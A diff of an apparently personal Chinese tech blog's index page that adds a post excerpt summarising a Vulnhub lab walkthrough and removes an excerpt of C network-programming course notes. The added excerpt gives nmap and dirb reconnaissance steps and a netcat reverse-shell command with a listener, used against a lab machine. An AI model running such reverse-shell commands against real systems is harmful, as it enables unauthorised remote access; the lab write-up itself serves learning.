@@ -137,6 +137,62 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/06/03/silky：0x02靶机总结/">
+        <p class="h4 index-header">silky：0x02靶机总结</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">靶机靶机来源vulnhub
+下载 ova文件，VM 或 VB 都是可以直接打开的
+渗透具体可以详细可以参阅 YouTube
+我这里来记录下我的过程
+扫主机nmap 10.0.0.0/24我的是这个网段
+或者直接使用netdiscover进行主机发现，比不过比较慢
+我这里的靶机IP是10.0.0.141
+扫服务 nmap -A 10.0.0.141 扫出具体的端口及其服务。
+发现 22 端口和 80 直接访问80 
+打开看是一个登陆页面，随意点点看，有个登陆页
+后台路径遍历dirb http://10.0.0.141 /var/share/wordlists/dirb/common.txt
+没有扫出什么有用的，搞登陆页
+登陆页弱口令试试，没发现什么。hydra 爆破 http有待学习，
+根据视频提示username 参数有代码执行
+代码执行这里直接上一个nc的反弹shell
+nc 10.0.0.141 8848 -t -e /bin/bash
+攻击机这边监听
+nc -lnvp 8848
+界面不好看，上一个python的pty
+python -c &quot;import pty;pty.</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-06-03&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/linux">linux</a>&nbsp;
+          
+            <a href="/tags/web%E6%B8%97%E9%80%8F">web渗透</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2019/05/30/内存基础/">
         <p class="h4 index-header">内存基础</p>
         
@@ -566,52 +622,6 @@ Ajax 即“Asynchronous Javascript And XM</div>
           <i class="iconfont icon-tag"></i>
           
             <a href="/tags/%E5%89%8D%E7%AB%AF">前端</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/04/26/课程笔记：计算机网络C程序设计/">
-        <p class="h4 index-header">课程笔记：计算机网络C程序设计</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">前言我对这个就真的是很感兴趣的，但是苦于不想干开发，只喜欢自己写写代码玩，不能当做工作来干。。。
-这堂课是东软的开发工程师于玉龙老师上的，于老师代码写得是真的不错，简单易懂，比网上代码有好多了，说的写的都是重点，这篇文章我也主要介绍下我的一些学习中的理解，主要的代码实现还是看看源码。
-自己的C语言当初老师教的浅显，后来就基本使用python代替日常开发了，所以也算是个复习和巩固的过程吧。。
-linux与 C下面这些技术都是在linux上实现的，计算机网络C程序开发嘛，也是各种网络设备4层和7层设备的底层实现，因为C接近底层，而linux内核右是一个极具开发前途的系统，可以在在上面加上可行的任何功能。。。
-我也是在学习中，下面都是我的学习笔记。如果后期有必要，再写一些吧。
-代码都在github源码地址
-目录介绍
-CH0201hello依旧是最喜欢的hello world
-02option这个很有用，获取命令行参数，并且可以自己定义方法，使用了getopt.h这个头文件，命令行工具必备。
-03cli自定义一个获取参数行的参数，这个不如第二个好用，个人建议使用第二个，但是这个更简单， 如果只</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-04-26&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0">课堂笔记</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/linux">linux</a>&nbsp;
-          
-            <a href="/tags/GCC">GCC</a>&nbsp;
           
         
       </div>
